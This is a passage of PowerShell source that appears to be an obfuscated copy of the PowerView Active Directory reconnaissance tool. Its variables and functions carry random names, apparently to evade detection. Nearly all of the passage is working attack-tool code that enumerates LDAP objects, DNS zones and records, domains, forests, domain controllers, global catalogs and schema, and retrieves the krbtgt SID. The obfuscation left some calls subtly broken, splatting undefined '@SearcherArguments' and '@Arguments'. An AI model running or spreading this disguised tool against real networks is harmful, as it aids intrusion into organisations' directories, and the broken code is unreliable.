    $hqDcSuel99.PropertyNames | ForEach-Object {
        if ($_ -ne 'adspath') {
            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
                $gAyJrOjX99[$_] = $hqDcSuel99[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq 'grouptype') {
                $gAyJrOjX99[$_] = $hqDcSuel99[$_][0] -as $IqNDhakH99
            }
            elseif ($_ -eq 'samaccounttype') {
                $gAyJrOjX99[$_] = $hqDcSuel99[$_][0] -as $dDIOSWaI99
            }
            elseif ($_ -eq 'objectguid') {
                $gAyJrOjX99[$_] = (New-Object Guid (,$hqDcSuel99[$_][0])).Guid
            }
            elseif ($_ -eq 'useraccountcontrol') {
                $gAyJrOjX99[$_] = $hqDcSuel99[$_][0] -as $CUtwcuxc99
            }
            elseif ($_ -eq 'ntsecuritydescriptor') {
                $sPLaMJnE99 = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $hqDcSuel99[$_][0], 0
                if ($sPLaMJnE99.Owner) {
                    $gAyJrOjX99['Owner'] = $sPLaMJnE99.Owner
                }
                if ($sPLaMJnE99.Group) {
                    $gAyJrOjX99['Group'] = $sPLaMJnE99.Group
                }
                if ($sPLaMJnE99.DiscretionaryAcl) {
                    $gAyJrOjX99['DiscretionaryAcl'] = $sPLaMJnE99.DiscretionaryAcl
                }
                if ($sPLaMJnE99.SystemAcl) {
                    $gAyJrOjX99['SystemAcl'] = $sPLaMJnE99.SystemAcl
                }
            }
            elseif ($_ -eq 'accountexpires') {
                if ($hqDcSuel99[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    $gAyJrOjX99[$_] = "NEVER"
                }
                else {
                    $gAyJrOjX99[$_] = [datetime]::fromfiletime($hqDcSuel99[$_][0])
                }
            }
            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
                if ($hqDcSuel99[$_][0] -is [System.MarshalByRefObject]) {
                    $Temp = $hqDcSuel99[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $gAyJrOjX99[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
                }
                else {
                    $gAyJrOjX99[$_] = ([datetime]::FromFileTime(($hqDcSuel99[$_][0])))
                }
            }
            elseif ($hqDcSuel99[$_][0] -is [System.MarshalByRefObject]) {
                $Prop = $hqDcSuel99[$_]
                try {
                    $Temp = $Prop[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $gAyJrOjX99[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
                }
                catch {
                    Write-Verbose "[Jagger] error: $_"
                    $gAyJrOjX99[$_] = $Prop[$_]
                }
            }
            elseif ($hqDcSuel99[$_].count -eq 1) {
                $gAyJrOjX99[$_] = $hqDcSuel99[$_][0]
            }
            else {
                $gAyJrOjX99[$_] = $hqDcSuel99[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property $gAyJrOjX99
    }
    catch {
        Write-Warning "[Jagger] Error parsing LDAP properties : $_"
    }
}



function misbehaves {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $NzjfVMfT99,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $hqDcSuel99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $pQbfmzwr99,

        [ValidateNotNullOrEmpty()]
        [String]
        $XMMBoDpm99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99 = 120,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $kXEJXDlJ99,

        [Switch]
        $adpABMuf99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $ydWBwabR99 = $JXWXuoyG99

            if ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
                $thGIxDFy99 = $ENV:USERDNSDOMAIN
                if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $thGIxDFy99) {
                    $JrhlWNWP99 = "$($ENV:LOGONSERVER -replace '\\','').$thGIxDFy99"
                }
            }
        }
        elseif ($PSBoundParameters['Credential']) {
            $YwwGFQeU99 = foretasted -Credential $tYWiEqAT99
            $JrhlWNWP99 = ($YwwGFQeU99.PdcRoleOwner).Name
            $ydWBwabR99 = $YwwGFQeU99.Name
        }
        elseif ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
            $ydWBwabR99 = $ENV:USERDNSDOMAIN
            if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $ydWBwabR99) {
                $JrhlWNWP99 = "$($ENV:LOGONSERVER -replace '\\','').$ydWBwabR99"
            }
        }
        else {
            write-verbose "get-domain"
            $YwwGFQeU99 = foretasted
            $JrhlWNWP99 = ($YwwGFQeU99.PdcRoleOwner).Name
            $ydWBwabR99 = $YwwGFQeU99.Name
        }

        if ($PSBoundParameters['Server']) {
            $JrhlWNWP99 = $tqOJuvTN99
        }

        $EMVHCnCU99 = 'LDAP://'

        if ($JrhlWNWP99 -and ($JrhlWNWP99.Trim() -ne '')) {
            $EMVHCnCU99 += $JrhlWNWP99
            if ($ydWBwabR99) {
                $EMVHCnCU99 += '/'
            }
        }

        if ($PSBoundParameters['SearchBasePrefix']) {
            $EMVHCnCU99 += $XMMBoDpm99 + ','
        }

        if ($PSBoundParameters['SearchBase']) {
            if ($pQbfmzwr99 -Match '^GC://') {
                $DN = $pQbfmzwr99.ToUpper().Trim('/')
                $EMVHCnCU99 = ''
            }
            else {
                if ($pQbfmzwr99 -match '^LDAP://') {
                    if ($pQbfmzwr99 -match "LDAP://.+/.+") {
                        $EMVHCnCU99 = ''
                        $DN = $pQbfmzwr99
                    }
                    else {
                        $DN = $pQbfmzwr99.SubString(7)
                    }
                }
                else {
                    $DN = $pQbfmzwr99
                }
            }
        }
        else {
            if ($ydWBwabR99 -and ($ydWBwabR99.Trim() -ne '')) {
                $DN = "DC=$($ydWBwabR99.Replace('.', ',DC='))"
            }
        }

        $EMVHCnCU99 += $DN
        Write-Verbose "[misbehaves] search base: $EMVHCnCU99"

        if ($tYWiEqAT99 -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose "[misbehaves] Using alternate credentials for LDAP connection"
            $YwwGFQeU99 = New-Object DirectoryServices.DirectoryEntry($EMVHCnCU99, $tYWiEqAT99.UserName, $tYWiEqAT99.GetNetworkCredential().Password)
            $cPmTyRvC99 = New-Object System.DirectoryServices.DirectorySearcher($YwwGFQeU99)
        }
        else {
            $cPmTyRvC99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$EMVHCnCU99)
        }

        $cPmTyRvC99.PageSize = $ixOvvLXO99
        $cPmTyRvC99.SearchScope = $lGlQEcNF99
        $cPmTyRvC99.CacheResults = $False
        $cPmTyRvC99.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All

        if ($PSBoundParameters['ServerTimeLimit']) {
            $cPmTyRvC99.ServerTimeLimit = $EQlXfKFO99
        }

        if ($PSBoundParameters['Tombstone']) {
            $cPmTyRvC99.Tombstone = $True
        }

        if ($PSBoundParameters['LDAPFilter']) {
            $cPmTyRvC99.filter = $NzjfVMfT99
        }

        if ($PSBoundParameters['SecurityMasks']) {
            $cPmTyRvC99.SecurityMasks = Switch ($kXEJXDlJ99) {
                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                'None' { [System.DirectoryServices.SecurityMasks]::None }
                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }

        if ($PSBoundParameters['Properties']) {
            $qdhXiCng99 = $hqDcSuel99| ForEach-Object { $_.Split(',') }
            $Null = $cPmTyRvC99.PropertiesToLoad.AddRange(($qdhXiCng99))
        }

        $cPmTyRvC99
    }
}


function washerwomen {

    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Byte[]]
        $RRDjQGFg99
    )

    BEGIN {
        function axe {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseOutputTypeCorrectly', '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Raw
            )

            [Int]$nAvRYESE99 = $Raw[0]
            [Int]$FWgkXnBw99 = $Raw[1]
            [Int]$Index =  2
            [String]$Name  = ''

            while ($FWgkXnBw99-- -gt 0)
            {
                [Int]$QwkIsyNX99 = $Raw[$Index++]
                while ($QwkIsyNX99-- -gt 0) {
                    $Name += [Char]$Raw[$Index++]
                }
                $Name += "."
            }
            $Name
        }
    }

    PROCESS {
        $VuxzePoI99 = [BitConverter]::ToUInt16($RRDjQGFg99, 2)
        $sBLfUYhS99 = [BitConverter]::ToUInt32($RRDjQGFg99, 8)

        $XvlBvFKs99 = $RRDjQGFg99[12..15]

        $Null = [array]::Reverse($XvlBvFKs99)
        $TTL = [BitConverter]::ToUInt32($XvlBvFKs99, 0)

        $Age = [BitConverter]::ToUInt32($RRDjQGFg99, 20)
        if ($Age -ne 0) {
            $nGTwAQHF99 = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours($age)).ToString()
        }
        else {
            $nGTwAQHF99 = '[static]'
        }

        $iRyPGdpI99 = New-Object PSObject

        if ($VuxzePoI99 -eq 1) {
            $IP = "{0}.{1}.{2}.{3}" -f $RRDjQGFg99[24], $RRDjQGFg99[25], $RRDjQGFg99[26], $RRDjQGFg99[27]
            $Data = $IP
            $iRyPGdpI99 | Add-Member Noteproperty 'RecordType' 'A'
        }

        elseif ($VuxzePoI99 -eq 2) {
            $ZJzgyivY99 = axe $RRDjQGFg99[24..$RRDjQGFg99.length]
            $Data = $ZJzgyivY99
            $iRyPGdpI99 | Add-Member Noteproperty 'RecordType' 'NS'
        }

        elseif ($VuxzePoI99 -eq 5) {
            $Alias = axe $RRDjQGFg99[24..$RRDjQGFg99.length]
            $Data = $Alias
            $iRyPGdpI99 | Add-Member Noteproperty 'RecordType' 'CNAME'
        }

        elseif ($VuxzePoI99 -eq 6) {
            $Data = $([System.Convert]::ToBase64String($RRDjQGFg99[24..$RRDjQGFg99.length]))
            $iRyPGdpI99 | Add-Member Noteproperty 'RecordType' 'SOA'
        }

        elseif ($VuxzePoI99 -eq 12) {
            $Ptr = axe $RRDjQGFg99[24..$RRDjQGFg99.length]
            $Data = $Ptr
            $iRyPGdpI99 | Add-Member Noteproperty 'RecordType' 'PTR'
        }

        elseif ($VuxzePoI99 -eq 13) {
            $Data = $([System.Convert]::ToBase64String($RRDjQGFg99[24..$RRDjQGFg99.length]))
            $iRyPGdpI99 | Add-Member Noteproperty 'RecordType' 'HINFO'
        }

        elseif ($VuxzePoI99 -eq 15) {
            $Data = $([System.Convert]::ToBase64String($RRDjQGFg99[24..$RRDjQGFg99.length]))
            $iRyPGdpI99 | Add-Member Noteproperty 'RecordType' 'MX'
        }

        elseif ($VuxzePoI99 -eq 16) {
            [string]$TXT  = ''
            [int]$QwkIsyNX99 = $RRDjQGFg99[24]
            $Index = 25

            while ($QwkIsyNX99-- -gt 0) {
                $TXT += [char]$RRDjQGFg99[$index++]
            }

            $Data = $TXT
            $iRyPGdpI99 | Add-Member Noteproperty 'RecordType' 'TXT'
        }

        elseif ($VuxzePoI99 -eq 28) {
            $Data = $([System.Convert]::ToBase64String($RRDjQGFg99[24..$RRDjQGFg99.length]))
            $iRyPGdpI99 | Add-Member Noteproperty 'RecordType' 'AAAA'
        }

        elseif ($VuxzePoI99 -eq 33) {
            $Data = $([System.Convert]::ToBase64String($RRDjQGFg99[24..$RRDjQGFg99.length]))
            $iRyPGdpI99 | Add-Member Noteproperty 'RecordType' 'SRV'
        }

        else {
            $Data = $([System.Convert]::ToBase64String($RRDjQGFg99[24..$RRDjQGFg99.length]))
            $iRyPGdpI99 | Add-Member Noteproperty 'RecordType' 'UNKNOWN'
        }

        $iRyPGdpI99 | Add-Member Noteproperty 'UpdatedAtSerial' $sBLfUYhS99
        $iRyPGdpI99 | Add-Member Noteproperty 'TTL' $TTL
        $iRyPGdpI99 | Add-Member Noteproperty 'Age' $Age
        $iRyPGdpI99 | Add-Member Noteproperty 'TimeStamp' $nGTwAQHF99
        $iRyPGdpI99 | Add-Member Noteproperty 'Data' $Data
        $iRyPGdpI99
    }
}


function ridiculous {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSZone')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $hqDcSuel99,

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [Alias('ReturnOne')]
        [Switch]
        $dmDYWlHe99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $nlvvSWoK99 = @{
            'LDAPFilter' = '(objectClass=dnsZone)'
        }
        if ($PSBoundParameters['Domain']) { $nlvvSWoK99['Domain'] = $JXWXuoyG99 }
        if ($PSBoundParameters['Server']) { $nlvvSWoK99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['Properties']) { $nlvvSWoK99['Properties'] = $hqDcSuel99 }
        if ($PSBoundParameters['ResultPageSize']) { $nlvvSWoK99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $nlvvSWoK99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['Credential']) { $nlvvSWoK99['Credential'] = $tYWiEqAT99 }
        $rsQUUknu99 = misbehaves @SearcherArguments

        if ($rsQUUknu99) {
            if ($PSBoundParameters['FindOne']) { $DEbeunXw99 = $rsQUUknu99.FindOne()  }
            else { $DEbeunXw99 = $rsQUUknu99.FindAll() }
            $DEbeunXw99 | Where-Object {$_} | ForEach-Object {
                $Out = Jagger -Properties $_.Properties
                $Out | Add-Member NoteProperty 'ZoneName' $Out.name
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                $Out
            }

            if ($DEbeunXw99) {
                try { $DEbeunXw99.dispose() }
                catch {
                    Write-Verbose "[Kojak] Error disposing of the Results object: $_"
                }
            }
            $rsQUUknu99.dispose()
        }

        $nlvvSWoK99['SearchBasePrefix'] = 'CN=MicrosoftDNS,DC=DomainDnsZones'
        $fmsnbznc99 = misbehaves @SearcherArguments

        if ($fmsnbznc99) {
            try {
                if ($PSBoundParameters['FindOne']) { $DEbeunXw99 = $fmsnbznc99.FindOne() }
                else { $DEbeunXw99 = $fmsnbznc99.FindAll() }
                $DEbeunXw99 | Where-Object {$_} | ForEach-Object {
                    $Out = Jagger -Properties $_.Properties
                    $Out | Add-Member NoteProperty 'ZoneName' $Out.name
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                    $Out
                }
                if ($DEbeunXw99) {
                    try { $DEbeunXw99.dispose() }
                    catch {
                        Write-Verbose "[ridiculous] Error disposing of the Results object: $_"
                    }
                }
            }
            catch {
                Write-Verbose "[ridiculous] Error accessing 'CN=MicrosoftDNS,DC=DomainDnsZones'"
            }
            $fmsnbznc99.dispose()
        }
    }
}


function reestablishes {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSRecord')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0,  Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $yvasxwOL99,

        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $hqDcSuel99 = 'name,distinguishedname,dnsrecord,whencreated,whenchanged',

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [Alias('ReturnOne')]
        [Switch]
        $dmDYWlHe99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $nlvvSWoK99 = @{
            'LDAPFilter' = '(objectClass=dnsNode)'
            'SearchBasePrefix' = "DC=$($yvasxwOL99),CN=MicrosoftDNS,DC=DomainDnsZones"
        }
        if ($PSBoundParameters['Domain']) { $nlvvSWoK99['Domain'] = $JXWXuoyG99 }
        if ($PSBoundParameters['Server']) { $nlvvSWoK99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['Properties']) { $nlvvSWoK99['Properties'] = $hqDcSuel99 }
        if ($PSBoundParameters['ResultPageSize']) { $nlvvSWoK99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $nlvvSWoK99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['Credential']) { $nlvvSWoK99['Credential'] = $tYWiEqAT99 }
        $XTKgRwWN99 = misbehaves @SearcherArguments

        if ($XTKgRwWN99) {
            if ($PSBoundParameters['FindOne']) { $DEbeunXw99 = $XTKgRwWN99.FindOne() }
            else { $DEbeunXw99 = $XTKgRwWN99.FindAll() }
            $DEbeunXw99 | Where-Object {$_} | ForEach-Object {
                try {
                    $Out = Jagger -Properties $_.Properties | Select-Object name,distinguishedname,dnsrecord,whencreated,whenchanged
                    $Out | Add-Member NoteProperty 'ZoneName' $yvasxwOL99

                    if ($Out.dnsrecord -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                        $NgfZTxEf99 = washerwomen -DNSRecord $Out.dnsrecord[0]
                    }
                    else {
                        $NgfZTxEf99 = washerwomen -DNSRecord $Out.dnsrecord
                    }

                    if ($NgfZTxEf99) {
                        $NgfZTxEf99.PSObject.Properties | ForEach-Object {
                            $Out | Add-Member NoteProperty $_.Name $_.Value
                        }
                    }

                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSRecord')
                    $Out
                }
                catch {
                    Write-Warning "[reestablishes] Error: $_"
                    $Out
                }
            }

            if ($DEbeunXw99) {
                try { $DEbeunXw99.dispose() }
                catch {
                    Write-Verbose "[reestablishes] Error disposing of the Results object: $_"
                }
            }
            $XTKgRwWN99.dispose()
        }
    }
}


function foretasted {

    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters['Credential']) {

            Write-Verbose '[foretasted] Using alternate credentials for foretasted'

            if ($PSBoundParameters['Domain']) {
                $ydWBwabR99 = $JXWXuoyG99
            }
            else {
                $ydWBwabR99 = $tYWiEqAT99.GetNetworkCredential().Domain
                Write-Verbose "[foretasted] Extracted domain '$ydWBwabR99' from -Credential"
            }

            $PFgQCUyQ99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $ydWBwabR99, $tYWiEqAT99.UserName, $tYWiEqAT99.GetNetworkCredential().Password)

            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($PFgQCUyQ99)
            }
            catch {
                Write-Verbose "[foretasted] The specified domain '$ydWBwabR99' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
            }
        }
        elseif ($PSBoundParameters['Domain']) {
            $PFgQCUyQ99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $JXWXuoyG99)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($PFgQCUyQ99)
            }
            catch {
                Write-Verbose "[foretasted] The specified domain '$JXWXuoyG99' does not exist, could not be contacted, or there isn't an existing trust : $_"
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose "[foretasted] Error retrieving the current domain: $_"
            }
        }
    }
}


function militarist {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Computer')]
    [OutputType('System.DirectoryServices.ActiveDirectory.DomainController')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [String]
        $JXWXuoyG99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [Switch]
        $LDAP,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $lObXiBcr99 = @{}
        if ($PSBoundParameters['Domain']) { $lObXiBcr99['Domain'] = $JXWXuoyG99 }
        if ($PSBoundParameters['Credential']) { $lObXiBcr99['Credential'] = $tYWiEqAT99 }

        if ($PSBoundParameters['LDAP'] -or $PSBoundParameters['Server']) {
            if ($PSBoundParameters['Server']) { $lObXiBcr99['Server'] = $tqOJuvTN99 }

            $lObXiBcr99['LDAPFilter'] = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'

            undergrad @Arguments
        }
        else {
            $OlJvSeiX99 = foretasted @Arguments
            if ($OlJvSeiX99) {
                $OlJvSeiX99.DomainControllers
            }
        }
    }
}


function muesli {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $hQLbQXcH99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters['Credential']) {

            Write-Verbose "[muesli] Using alternate credentials for muesli"

            if ($PSBoundParameters['Forest']) {
                $RtuCSCyh99 = $hQLbQXcH99
            }
            else {
                $RtuCSCyh99 = $tYWiEqAT99.GetNetworkCredential().Domain
                Write-Verbose "[muesli] Extracted domain '$hQLbQXcH99' from -Credential"
            }

            $HSmhiEGv99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $RtuCSCyh99, $tYWiEqAT99.UserName, $tYWiEqAT99.GetNetworkCredential().Password)

            try {
                $lamZkGdl99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($HSmhiEGv99)
            }
            catch {
                Write-Verbose "[muesli] The specified forest '$RtuCSCyh99' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
                $Null
            }
        }
        elseif ($PSBoundParameters['Forest']) {
            $HSmhiEGv99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $hQLbQXcH99)
            try {
                $lamZkGdl99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($HSmhiEGv99)
            }
            catch {
                Write-Verbose "[muesli] The specified forest '$hQLbQXcH99' does not exist, could not be contacted, or there isn't an existing trust: $_"
                return $Null
            }
        }
        else {
            $lamZkGdl99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        }

        if ($lamZkGdl99) {
            if ($PSBoundParameters['Credential']) {
                $IywVkUgU99 = (asseverate -Identity "krbtgt" -Domain $lamZkGdl99.RootDomain.Name -Credential $tYWiEqAT99).objectsid
            }
            else {
                $IywVkUgU99 = (asseverate -Identity "krbtgt" -Domain $lamZkGdl99.RootDomain.Name).objectsid
            }

            $Parts = $IywVkUgU99 -Split '-'
            $IywVkUgU99 = $Parts[0..$($Parts.length-2)] -join '-'
            $lamZkGdl99 | Add-Member NoteProperty 'RootDomainSid' $IywVkUgU99
            $lamZkGdl99
        }
    }
}


function morbid {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.Domain')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $hQLbQXcH99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $lObXiBcr99 = @{}
        if ($PSBoundParameters['Forest']) { $lObXiBcr99['Forest'] = $hQLbQXcH99 }
        if ($PSBoundParameters['Credential']) { $lObXiBcr99['Credential'] = $tYWiEqAT99 }

        $lamZkGdl99 = muesli @Arguments
        if ($lamZkGdl99) {
            $lamZkGdl99.Domains
        }
    }
}


function unsuited {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.GlobalCatalog')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $hQLbQXcH99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $lObXiBcr99 = @{}
        if ($PSBoundParameters['Forest']) { $lObXiBcr99['Forest'] = $hQLbQXcH99 }
        if ($PSBoundParameters['Credential']) { $lObXiBcr99['Credential'] = $tYWiEqAT99 }

        $lamZkGdl99 = muesli @Arguments

        if ($lamZkGdl99) {
            $lamZkGdl99.FindAllGlobalCatalogs()
        }
    }
}


function aphid {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [Alias('Class')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $rXZqIUez99,

        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $hQLbQXcH99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $lObXiBcr99 = @{}
        if ($PSBoundParameters['Forest']) { $lObXiBcr99['Forest'] = $hQLbQXcH99 }
        if ($PSBoundParameters['Credential']) { $lObXiBcr99['Credential'] = $tYWiEqAT99 }

        $lamZkGdl99 = muesli @Arguments

        if ($lamZkGdl99) {
            if ($PSBoundParameters['ClassName']) {
                ForEach ($MBXzcJuI99 in $rXZqIUez99) {
                    $lamZkGdl99.Schema.FindClass($MBXzcJuI99)
                }
            }
            else {
                $lamZkGdl99.Schema.FindAllClasses()
            }
        }
    }
}


function emasculation {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.PropertyOutlier')]
    [CmdletBinding(DefaultParameterSetName = 'ClassName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ClassName')]
        [Alias('Class')]
        [ValidateSet('User', 'Group', 'Computer')]
        [String]
        $rXZqIUez99,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $eUYfAtbv99,

        [Parameter(ValueFromPipeline = $True, Mandatory = $True, ParameterSetName = 'ReferenceObject')]
        [PSCustomObject]
        $YAFcRrIA99,

        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $NzjfVMfT99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $pQbfmzwr99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [Switch]
